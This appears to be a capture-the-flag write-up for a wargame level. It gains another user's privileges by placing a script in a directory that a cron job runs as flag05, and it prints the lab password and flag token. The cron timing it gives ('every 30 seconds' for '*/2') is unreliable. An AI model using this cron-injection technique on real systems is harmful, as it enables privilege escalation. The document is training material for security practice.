`su level05 -> ne2searoevaevoem4ov4ar8ap`

When we log in we can see:

```
You have a new mail.
```
On Linux we can find our mail folder with `echo $MAIL` -> /var/mail/level05

We have a file named level05 in /var/mail/level05:

```
$ cat /var/mail/level05 
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Check the content of /usr/sbin/openarenaserver:

```
$ cat /usr/sbin/opearenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done 
```

This script is a cron job, running every 30 seconds, that iterates on every files in /opt/openarenaserver/ and execute it with the permissions of the crontab owner, then erase it.
We need to create a little script to get the flag:

```
echo "getflag > /tmp/flag" > /opt/openarenaserver/script
```

Wait 30 seconds and get the flag:

```
$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
